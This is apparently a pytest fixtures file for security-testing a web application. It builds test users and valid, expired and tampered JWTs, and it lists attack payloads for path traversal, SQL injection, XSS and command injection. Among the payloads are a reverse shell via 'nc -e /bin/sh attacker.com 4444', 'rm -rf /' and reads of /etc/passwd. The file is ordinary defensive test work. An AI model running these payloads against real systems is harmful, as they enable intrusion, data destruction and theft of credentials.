"""Security test fixtures and utilities."""

from datetime import datetime, timedelta

import jwt
import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from src.auth.jwt import create_access_token
from src.auth.models import User
from src.auth.password import hash_password
from src.config.settings import get_settings

settings = get_settings()


@pytest.fixture()
async def test_user(db_session: AsyncSession) -> User:
    """Create a test user for security testing."""
    user = User(
        username="testuser",
        email="test@example.com",
        hashed_password=hash_password("testpass123"),
        is_active=True,
        is_superuser=False,
    )
    db_session.add(user)
    await db_session.commit()
    await db_session.refresh(user)
    return user


@pytest.fixture()
async def inactive_user(db_session: AsyncSession) -> User:
    """Create an inactive test user."""
    user = User(
        username="inactiveuser",
        email="inactive@example.com",
        hashed_password=hash_password("testpass123"),
        is_active=False,
        is_superuser=False,
    )
    db_session.add(user)
    await db_session.commit()
    await db_session.refresh(user)
    return user


@pytest.fixture()
async def superuser(db_session: AsyncSession) -> User:
    """Create a superuser for testing."""
    user = User(
        username="admin",
        email="admin@example.com",
        hashed_password=hash_password("adminpass123"),
        is_active=True,
        is_superuser=True,
    )
    db_session.add(user)
    await db_session.commit()
    await db_session.refresh(user)
    return user


@pytest.fixture()
async def second_user(db_session: AsyncSession) -> User:
    """Create a second user for authorization testing."""
    user = User(
        username="seconduser",
        email="second@example.com",
        hashed_password=hash_password("secondpass123"),
        is_active=True,
        is_superuser=False,
    )
    db_session.add(user)
    await db_session.commit()
    await db_session.refresh(user)
    return user


@pytest.fixture()
def auth_token(test_user: User) -> str:
    """Generate valid auth token for test user."""
    return create_access_token(data={"sub": test_user.username, "user_id": test_user.id})


@pytest.fixture()
def auth_headers(auth_token: str) -> dict:
    """Auth headers with valid token for test user."""
    return {"Authorization": f"Bearer {auth_token}"}


@pytest.fixture()
def superuser_token(superuser: User) -> str:
    """Generate valid auth token for superuser."""
    return create_access_token(data={"sub": superuser.username, "user_id": superuser.id})


@pytest.fixture()
def admin_headers(superuser_token: str) -> dict:
    """Auth headers with superuser token."""
    return {"Authorization": f"Bearer {superuser_token}"}


@pytest.fixture()
def second_user_token(second_user: User) -> str:
    """Generate valid auth token for second user."""
    return create_access_token(data={"sub": second_user.username, "user_id": second_user.id})


@pytest.fixture()
def second_user_headers(second_user_token: str) -> dict:
    """Auth headers for second user."""
    return {"Authorization": f"Bearer {second_user_token}"}


@pytest.fixture()
def expired_token(test_user: User) -> str:
    """Generate an expired JWT token."""
    expire = datetime.utcnow() - timedelta(hours=1)
    to_encode = {
        "sub": test_user.username,
        "user_id": test_user.id,
        "exp": expire,
        "iat": datetime.utcnow() - timedelta(hours=2),
    }
    return jwt.encode(to_encode, settings.jwt_secret_key, algorithm=settings.jwt_algorithm)


@pytest.fixture()
def malformed_token() -> str:
    """Generate a malformed JWT token."""
    return "invalid.token.here"


@pytest.fixture()
def tampered_token(test_user: User) -> str:
    """Generate a tampered JWT token."""
    token = create_access_token(data={"sub": test_user.username, "user_id": test_user.id})
    parts = token.split(".")
    parts[1] = parts[1][:-1] + "X"
    return ".".join(parts)


@pytest.fixture()
def token_without_user_id(test_user: User) -> str:
    """Generate token without user_id claim (malformed)."""
    expire = datetime.utcnow() + timedelta(minutes=30)
    to_encode = {"sub": test_user.username, "exp": expire, "iat": datetime.utcnow()}
    return jwt.encode(to_encode, settings.jwt_secret_key, algorithm=settings.jwt_algorithm)


@pytest.fixture()
def token_for_nonexistent_user() -> str:
    """Generate valid token for user that doesn't exist."""
    return create_access_token(data={"sub": "nonexistent_user_xyz", "user_id": 99999})


@pytest.fixture()
def path_traversal_payloads() -> list[str]:
    """Common path traversal attack payloads."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%00/etc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "/etc/passwd",
        "\\\\localhost\\c$\\windows\\system32\\config\\sam",
        "file:///etc/passwd",
        "../../../../../../../../../../etc/passwd",
    ]


@pytest.fixture()
def malicious_filenames() -> list[str]:
    """Malicious filenames for testing."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "file\x00.php",
        "CON.txt",
        "PRN.txt",
        "AUX.pdf",
        "NUL.doc",
        "COM1.txt",
        "LPT1.doc",
    ]


@pytest.fixture()
def sql_injection_payloads() -> list[str]:
    """SQL injection attack payloads."""
    return [
        "' OR '1'='1",
        "1' OR '1' = '1",
        "admin'--",
        "' OR 1=1--",
        "1; DROP TABLE users--",
        "'; DROP TABLE users; --",
        "1' UNION SELECT NULL--",
        "admin' OR '1'='1'/*",
    ]


@pytest.fixture()
def xss_payloads() -> list[str]:
    """XSS attack payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    ]


@pytest.fixture()
def command_injection_payloads() -> list[str]:
    """Command injection attack payloads."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "; nc -e /bin/sh attacker.com 4444",
    ]


@pytest.fixture()
def malicious_file_extensions() -> list[str]:
    """File extensions that should be blocked."""
    return [
        ".exe",
        ".bat",
        ".cmd",
        ".com",
        ".pif",
        ".scr",
        ".php",
        ".jsp",
        ".asp",
        ".aspx",
        ".py",
        ".pl",
        ".sh",
        ".bash",
        ".ps1",
        ".vbs",
        ".wsf",
        ".js",
    ]
